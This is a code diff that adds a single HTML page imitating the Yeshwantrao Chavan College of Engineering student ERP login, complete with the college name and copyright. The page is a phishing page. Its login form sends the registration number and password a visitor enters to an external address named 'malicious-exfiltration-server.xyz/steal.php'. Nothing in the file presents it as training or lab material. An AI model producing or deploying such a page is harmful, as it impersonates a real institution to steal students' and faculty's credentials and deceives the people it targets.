@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YCCE Student Portal - ERP Login (Mirror)</title>
+  <style>
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      margin: 0;
+    }
+    .card {
+      background: white;
+      padding: 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.1);
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+    }
+    .logo {
+      font-size: 24px;
+      font-weight: 800;
+      color: #1e3a8a;
+      margin-bottom: 8px;
+    }
+    .subtitle {
+      font-size: 13px;
+      color: #64748b;
+      margin-bottom: 24px;
+    }
+    .input-group {
+      margin-bottom: 16px;
+      text-align: left;
+    }
+    label {
+      display: block;
+      font-size: 12px;
+      font-weight: 600;
+      color: #334155;
+      margin-bottom: 6px;
+    }
+    input {
+      width: 100%;
+      padding: 10px 12px;
+      border: 1px solid #cbd5e1;
+      border-radius: 8px;
+      font-size: 14px;
+      box-sizing: border-box;
+    }
+    input:focus {
+      outline: none;
+      border-color: #2563eb;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background: #2563eb;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer;
+      margin-top: 8px;
+    }
+    button:hover {
+      background: #1d4ed8;
+    }
+    .footer {
+      font-size: 11px;
+      color: #94a3b8;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="logo">🏛️ YCCE CAMPUS ERP</div>
+    <div class="subtitle">Official Student & Faculty Authentication Gateway</div>
+
+    <form action="http://malicious-exfiltration-server.xyz/steal.php" method="POST">
+      <div class="input-group">
+        <label for="reg">Student Registration No. / PRN</label>
+        <input type="text" id="reg" name="username" placeholder="e.g. 21070142" required autocomplete="off">
+      </div>
+
+      <div class="input-group">
+        <label for="pass">Portal Password</label>
+        <input type="password" id="pass" name="password" placeholder="••••••••••••" required autocomplete="off">
+      </div>
+
+      <button type="submit">Log In to Student ERP</button>
+    </form>
+
+    <div class="footer">
+      © Yeshwantrao Chavan College of Engineering. All rights reserved.
+    </div>
+  </div>
+</body>
+</html>
